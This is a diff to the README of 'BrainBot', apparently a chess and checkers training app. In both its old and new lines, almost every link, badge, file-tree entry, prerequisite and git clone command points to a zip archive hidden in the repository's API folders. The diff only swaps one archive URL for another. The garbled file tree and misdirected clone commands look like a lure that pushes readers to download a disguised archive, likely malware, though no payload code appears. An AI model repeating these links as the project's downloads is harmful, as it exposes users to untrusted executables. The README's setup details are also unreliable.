@@ -1,5 +1,5 @@
 <p align="center">
-    <img src="https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip" align="center" width="30%">
+    <img src="https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip" align="center" width="30%">
 </p>
 <h1 align="center">BRAINBOT</h1>
 <p align="center">
@@ -7,10 +7,10 @@
 </p>
 
 <p align="center">
-	<img src="https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip" alt="license">
-	<img src="https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip" alt="last-commit">
-	<img src="https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip" alt="repo-top-language">
-	<img src="https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip" alt="repo-language-count">
+	<img src="https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip" alt="license">
+	<img src="https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip" alt="last-commit">
+	<img src="https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip" alt="repo-top-language">
+	<img src="https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip" alt="repo-language-count">
 </p>
 
 ---
@@ -67,24 +67,24 @@ It's a complete training ground for sharpening your decision-making and game str
 
 ```sh
 └── BrainBot/
-    ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-    ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+    ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+    ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
     ├── backend
     │   ├── .env
     │   ├── .gitignore
-    │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-    │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-    │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+    │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+    │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+    │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
     └── frontend
         ├── .env
-        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         ├── .gitignore
-        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         ├── public
         │   └── img
         │       └── chesspieces
@@ -94,69 +94,69 @@ It's a complete training ground for sharpening your decision-making and game str
         │   │   ├── api
         │   │   │   └── users
         │   │   ├── forgotpassword
-        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   │   ├── game
         │   │   │   ├── checkers
         │   │   │   └── chess
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   │   ├── login
-        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   │   ├── notifications
-        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   │   ├── otherlogins
-        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   │   ├── prompt
-        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   │   ├── resetpassword
-        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   │   ├── signup
-        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   │   ├── test
-        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   │   └── verifyemail
-        │   │       └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │       └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   ├── cloudinaryConfig
-        │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   ├── components
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   │   ├── logout
-        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   │   ├── toast
-        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   │   └── ui
-        │   │       ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │       └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │       ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │       └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   ├── cssFiles
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   ├── dbConfig
-        │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   ├── helpers
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   ├── lib
-        │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │   ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
         │   └── models
-        │       ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │       ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        │       └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
-        └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │       ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │       ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        │       └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        ├── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
+        └── https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
 ```
 ---
 
@@ -166,7 +166,7 @@ It's a complete training ground for sharpening your decision-making and game str
 
 Make sure your environment has the following:
 
-* https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip + npm
+* https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip + npm
 * Docker (optional)
 * TypeScript
 * MongoDB (or access to a MongoDB Atlas cluster)
@@ -178,7 +178,7 @@ Make sure your environment has the following:
 **Clone the repository:**
 
 ```sh
-❯ git clone https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+❯ git clone https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
 ❯ cd BrainBot
 ```
 
@@ -234,9 +234,9 @@ Make sure your environment has the following:
 
 ## 🔰 Contributing
 
-* 💬 [Start a Discussion](https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip)
-* 🐛 [Report Bugs / Request Features](https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip)
-* 📥 [Submit Pull Requests](https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip)
+* 💬 [Start a Discussion](https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip)
+* 🐛 [Report Bugs / Request Features](https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip)
+* 📥 [Submit Pull Requests](https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip)
 
 <details>
 <summary>Contributing Guidelines</summary>
@@ -244,7 +244,7 @@ Make sure your environment has the following:
 1. Fork the repo and clone it:
 
    ```sh
-   git clone https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+   git clone https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip
    ```
 2. Create a new feature branch:
 
@@ -268,8 +268,8 @@ Make sure your environment has the following:
 <summary>Contributor Graph</summary>
 <br>
 <p align="left">
-   <a href="https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip">
-      <img src="https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip" />
+   <a href="https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip">
+      <img src="https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip" />
    </a>
 </p>
 </details>
@@ -278,7 +278,7 @@ Make sure your environment has the following:
 
 ## 🎗 License
 
-This project is licensed under the [MIT License](https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip). See the [LICENSE](https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip) file for details.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip). See the [LICENSE](https://raw.githubusercontent.com/Rahulkichad/BrainBot/main/frontend/src/app/api/users/generatehighlights/Brain-Bot-plebiscite.zip) file for details.
 
 ---
 
